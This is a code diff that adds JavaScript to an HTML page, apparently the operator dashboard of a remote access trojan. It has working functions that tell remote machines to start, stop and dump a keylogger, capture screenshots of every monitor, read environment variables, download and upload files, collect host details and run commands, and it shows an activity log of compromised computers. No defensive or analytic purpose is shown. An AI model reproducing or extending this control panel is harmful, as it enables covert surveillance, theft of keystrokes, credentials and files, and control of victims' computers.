+async function fDown(i){if(!g_fe||!g_fe[i])return;const nm=g_fe[i].n||'';const p=g_fp+nm;const el=document.getElementById('filesB');const ee=document.getElementById('filesErr');ee.style.display='none';el.innerHTML='<div class="loading">DL '+esc(nm)+'...</div>';const r=await saw('file_download',p,el,'filesErr');if(r&&r.result&&!r.result.startsWith('err:')){const bin=atob(r.result);const arr=new Uint8Array(bin.length);for(let j=0;j<bin.length;j++)arr[j]=bin.charCodeAt(j);const blob=new Blob([arr]);const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=nm;a.click();URL.revokeObjectURL(a.href);toast('Downloaded '+nm)}else if(r)el.innerHTML='<div class="loading">'+esc(r.result||'Failed')+'</div>'}
+async function upFile(file){const p=g_fp+file.name;const reader=new FileReader();reader.onload=async function(e){const b64=e.target.result.split(',')[1];const el=document.getElementById('filesB');const ee=document.getElementById('filesErr');ee.style.display='none';el.innerHTML='<div class="loading">Upload '+esc(file.name)+'...</div>';const r=await saw('file_upload',JSON.stringify({path:p,data:b64}),el,'filesErr');if(r){if(g_fe&&Array.isArray(g_fe)){g_fe.push({n:file.name,s:Math.round(b64.length*0.75),m:new Date().toISOString().slice(0,10),d:false});rf()}else browseDir(g_fp)}};reader.readAsDataURL(file)}
+function handleDrop(e){e.preventDefault();document.getElementById('dropZ').classList.remove('drag');for(let f of e.dataTransfer.files)upFile(f)}
+function handleFP(i){for(let f of i.files)upFile(f);i.value=''}
+
+// === Host Info ===
+async function loadHost(){const el=document.getElementById('hostOut');const ee=document.getElementById('hostErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading host...</div>';const r=await saw('host_info','',el,'hostErr');if(r&&r.result){try{const d=JSON.parse(r.result);const g=document.getElementById('hostGrid');g.style.display='grid';let h='';h+='<div class="card"><div class="v">'+esc(d.host||'?')+'</div><div class="l">Hostname</div></div>';h+='<div class="card"><div class="v">'+esc(d.user||'?')+'</div><div class="l">User</div></div>';h+='<div class="card"><div class="v">'+esc(d.os||'?')+'</div><div class="l">OS</div></div>';h+='<div class="card"><div class="v">'+esc(d.arch||'?')+'</div><div class="l">Arch</div></div>';h+='<div class="card"><div class="v">'+d.cores+'</div><div class="l">CPU Cores</div></div>';h+='<div class="card"><div class="v">'+(d.ram/1024).toFixed(1)+' GB</div><div class="l">RAM</div></div>';h+='<div class="card"><div class="v">'+(d.ram_free/1024).toFixed(1)+' GB</div><div class="l">RAM Free</div></div>';h+='<div class="card"><div class="v">'+Math.floor(d.uptime/3600)+'h '+Math.floor((d.uptime%3600)/60)+'m</div><div class="l">Uptime</div></div>';if(d.gpus)h+='<div class="card"><div class="v" style="font-size:.85rem">'+esc(d.gpus)+'</div><div class="l">GPU</div></div>';if(d.disks&&d.disks.length)d.disks.forEach(dk=>{const pct=dk.t>0?((dk.t-dk.f)/dk.t*100).toFixed(0):0;h+='<div class="card"><div class="v">'+dk.d+': '+(dk.f).toFixed(1)+' GB</div><div class="l">'+(dk.v||'Drive')+' of '+dk.t+' GB</div><div class="disk-bar"><div class="fill" style="width:'+pct+'%"></div></div></div>'});g.innerHTML=h;el.innerHTML='<div style="color:var(--grn)">✓ Host info loaded</div>'}catch(e){el.innerHTML='<div class="loading">Parse error</div>'}}}
+async function loadEnv(){const el=document.getElementById('hostOut');const ee=document.getElementById('hostErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading env...</div>';const r=await saw('env_vars','',el,'hostErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem">'+esc(r.result)+'</pre>'}
+async function takeSSAll(){const el=document.getElementById('hostOut');const ee=document.getElementById('hostErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Capturing...</div>';const r=await saw('screenshot_all','',el,'hostErr');if(r&&r.result){const parts=r.result.split('===MON:');parts.forEach((p,i)=>{if(i===0)el.innerHTML='<img class="img-out" src="data:image/jpeg;base64,'+p+'">';else{const m=p.split('===\n');el.innerHTML+='<div class="smol">Mon '+m[0]+'</div><img class="img-out" src="data:image/jpeg;base64,'+m[1]+'">'}})}}
+
+// === Keylogger ===
+async function startKL(){const el=document.getElementById('klOut');const ee=document.getElementById('klErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Starting...</div>';const r=await saw('keylog_start','',el,'klErr');if(r){document.getElementById('klStart').style.display='none';document.getElementById('klStop').style.display='';document.getElementById('klStat').textContent='● Running';el.innerHTML='<div style="color:var(--grn)">Keylogger started</div>';toast('Keylogger started')}}
+async function stopKL(){const el=document.getElementById('klOut');const ee=document.getElementById('klErr');ee.style.display='none';const r=await saw('keylog_stop','',el,'klErr');if(r){document.getElementById('klStart').style.display='';document.getElementById('klStop').style.display='none';document.getElementById('klStat').textContent='Stopped';el.innerHTML='<div style="color:var(--grn)">Stopped</div>'}}
+async function dumpKL(){const el=document.getElementById('klOut');const ee=document.getElementById('klErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Dumping...</div>';const r=await saw('keylog_dump','',el,'klErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem;line-height:1.5">'+esc(r.result)+'</pre>'}
+
+// === Activity Log ===
+async function loadLog(){const el=document.getElementById('logOut');const ee=document.getElementById('logErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';try{const r=await fetch(FB+'/logs.json?limit=200');const d=await r.json();if(!d||!d.length){el.innerHTML='<div class="loading">No activity</div>';return}let h='';d.reverse().forEach(e=>{const t=new Date(e.t).toLocaleTimeString();h+='<div style="font-size:.7rem;padding:2px 0;border-bottom:1px solid rgba(255,255,255,.03)"><span style="color:var(--txt2)">'+t+'</span> <span style="color:var(--acc)">'+esc(e.type)+'</span> <span>'+esc(e.computer)+'</span> <span style="color:var(--txt2)">'+esc(e.detail||'')+'</span></div>'});el.innerHTML=h}catch(e){el.innerHTML='<div class="loading">Error</div>'}}
+
+// === Util ===
+function toast(m){const t=document.createElement('div');t.className='toast';t.textContent='✓ '+m;document.body.appendChild(t);setTimeout(()=>t.remove(),1800)}
+
+// Init monitors
+(function(){const sel=document.getElementById('monSel');for(let i=0;i<8;i++){const o=document.createElement('option');o.value=i;o.textContent='M'+(i+1);sel.appendChild(o)};const ls=document.getElementById('liveMon');for(let i=0;i<8;i++){const o=document.createElement('option');o.value=i;o.textContent='M'+(i+1);ls.appendChild(o)}})();
+
+// Cmd history
+let cmdHist=[],cmdIdx=-1;
+document.addEventListener('DOMContentLoaded',()=>{
+  const ci=document.getElementById('cmdIn');
+  if(ci)ci.addEventListener('keydown',e=>{
+    if(e.key==='ArrowUp'){e.preventDefault();if(cmdIdx<cmdHist.length-1){cmdIdx++;ci.value=cmdHist[cmdIdx]}}
+    else if(e.key==='ArrowDown'){e.preventDefault();if(cmdIdx>0){cmdIdx--;ci.value=cmdHist[cmdIdx]}else{cmdIdx=-1;ci.value=''}}
+  });
+});
+const _runCmd=runCmd;async function runCmdWithHist(){const ci=document.getElementById('cmdIn');const c=ci.value.trim();if(!c)return;if(cmdHist.length===0||cmdHist[cmdHist.length-1]!==c)cmdHist.push(c);cmdIdx=-1;return _runCmd()}
 </script>
 </body>
 </html>
